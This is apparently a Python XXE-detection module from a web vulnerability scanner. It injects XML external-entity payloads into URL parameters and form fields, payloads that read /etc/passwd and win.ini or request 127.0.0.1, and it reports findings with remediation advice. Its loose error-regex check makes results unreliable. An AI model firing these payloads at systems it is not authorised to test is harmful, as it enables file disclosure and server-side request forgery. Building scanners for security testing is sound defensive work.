#!/usr/bin/env python3
"""
XXE Scanner Module for Web Vulnerability Scanner
"""

import re
import requests
from urllib.parse import urlparse, parse_qs, urljoin

class XXEScanner:
    def __init__(self, scanner):
        """Initialize the XXE Scanner"""
        self.scanner = scanner
        self.logger = scanner.logger
        self.session = scanner.session
        self.timeout = scanner.timeout
        self.safe_mode = getattr(scanner.args, 'safe_mode', False)
    
    def check_xxe(self, url):
        """Check for XXE vulnerabilities in a URL"""
        self.logger.debug(f"Checking for XXE vulnerabilities on {url}")
        
        # Parse the URL to extract parameters
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Look for parameters that might accept XML input
        for param_name, param_values in query_params.items():
            if self._is_potential_xxe_param(param_name):
                for param_value in param_values:
                    self._test_xxe_parameter(url, param_name, param_value)
    
    def check_form_xxe(self, form_data):
        """Check for XXE vulnerabilities in a form"""
        url = form_data['url']
        action = form_data['action']
        method = form_data['method']
        inputs = form_data['inputs']
        
        self.logger.debug(f"Checking for XXE vulnerabilities in form on {url}")
        
        # Look for input fields that might accept XML
        for input_field in inputs:
            input_name = input_field.get('name', '')
            input_type = input_field.get('type', '')
            
            if self._is_potential_xxe_param(input_name):
                self._test_xxe_form_input(url, action, method, input_name)
    
    def _is_potential_xxe_param(self, param_name):
        """Check if parameter name suggests it might accept XML input"""
        xxe_keywords = [
            'xml', 'data', 'input', 'payload', 'content', 'document',
            'file', 'upload', 'import', 'feed', 'rss', 'soap', 'wsdl',
            'config', 'settings', 'template', 'format', 'request'
        ]
        
        param_lower = param_name.lower()
        return any(keyword in param_lower for keyword in xxe_keywords)
    
    def _test_xxe_parameter(self, url, param_name, param_value):
        """Test a parameter for XXE vulnerability"""
        if self.safe_mode:
            # In safe mode, just report the potential vulnerability
            self.scanner.report_vulnerability(
                url=url,
                vuln_type="XXE",
                description=f"Potential XXE vulnerability in parameter '{param_name}'",
                severity="MEDIUM",
                details={
                    "parameter": param_name,
                    "value": param_value,
                    "remediation": "Disable XML external entity processing in XML parsers. Use less complex data formats like JSON if possible."
                }
            )
            return
        
        # XXE payloads to test
        xxe_payloads = [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "http://127.0.0.1:80/"> %xxe;]><foo>bar</foo>'
        ]
        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for payload in xxe_payloads:
            # Create a modified URL with the test payload
            modified_params = query_params.copy()
            modified_params[param_name] = [payload]
            
            # Rebuild the query string
            from urllib.parse import urlencode
            modified_query = urlencode(modified_params, doseq=True)
            
            # Rebuild the URL
            modified_url = parsed_url._replace(query=modified_query).geturl()
            
            try:
                # Send the request
                headers = {'Content-Type': 'application/xml'}
                response = self.session.get(modified_url, headers=headers, timeout=self.timeout)
                
                # Check for signs of successful XXE
                if self._check_xxe_response(response, payload):
                    self.scanner.report_vulnerability(
                        url=url,
                        vuln_type="XXE",
                        description=f"XXE vulnerability in parameter '{param_name}'",
                        severity="HIGH",
                        details={
                            "parameter": param_name,
                            "payload": payload,
                            "response_code": response.status_code,
                            "response_length": len(response.text),
                            "remediation": "Disable XML external entity processing in XML parsers. Use less complex data formats like JSON if possible."
                        }
                    )
                    # Stop testing after finding a vulnerability
                    break
            
            except Exception as e:
                self.logger.debug(f"Error testing XXE payload on {url}: {e}")
    
    def _test_xxe_form_input(self, url, action, method, input_name):
        """Test a form input for XXE vulnerability"""
        if self.safe_mode:
            # In safe mode, just report the potential vulnerability
            self.scanner.report_vulnerability(
                url=url,
                vuln_type="XXE",
                description=f"Potential XXE vulnerability in form input '{input_name}'",
                severity="MEDIUM",
                details={
                    "form_action": action,
                    "form_method": method,
                    "input_name": input_name,
                    "remediation": "Disable XML external entity processing in XML parsers. Use less complex data formats like JSON if possible."
                }
            )
            return
        
        # XXE payloads to test
        xxe_payloads = [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "http://127.0.0.1:80/"> %xxe;]><foo>bar</foo>'
        ]
        
        for payload in xxe_payloads:
            try:
                # Prepare the form data
                form_data = {input_name: payload}
                
                # Send the request
                headers = {'Content-Type': 'application/xml'}
                if method.upper() == 'GET':
                    response = self.session.get(action, params=form_data, headers=headers, timeout=self.timeout)
                else:  # POST
                    response = self.session.post(action, data=form_data, headers=headers, timeout=self.timeout)
                
                # Check for signs of successful XXE
                if self._check_xxe_response(response, payload):
                    self.scanner.report_vulnerability(
                        url=url,
                        vuln_type="XXE",
                        description=f"XXE vulnerability in form input '{input_name}'",
                        severity="HIGH",
                        details={
                            "form_action": action,
                            "form_method": method,
                            "input_name": input_name,
                            "payload": payload,
                            "response_code": response.status_code,
                            "response_length": len(response.text),
                            "remediation": "Disable XML external entity processing in XML parsers. Use less complex data formats like JSON if possible."
                        }
                    )
                    # Stop testing after finding a vulnerability
                    break
            
            except Exception as e:
                self.logger.debug(f"Error testing XXE payload on form {action}: {e}")
    
    def _check_xxe_response(self, response, payload):
        """Check if the response indicates a successful XXE attack"""
        # Look for signs of successful XXE
        
        # Check for file content in response
        if "file:///etc/passwd" in payload and ("root:" in response.text or "nobody:" in response.text):
            return True
        
        if "file:///c:/windows/win.ini" in payload and ("[fonts]" in response.text or "[extensions]" in response.text):
            return True
        
        # Check for error messages that might indicate XXE processing
        xxe_error_patterns = [
            r"xml|entity|parsing|dtd|doctype",
            r"syntax|error|exception|failure",
            r"libxml|xerces|saxon"
        ]
        
        for pattern in xxe_error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                # This is a heuristic and might lead to false positives
                return True
        
        return False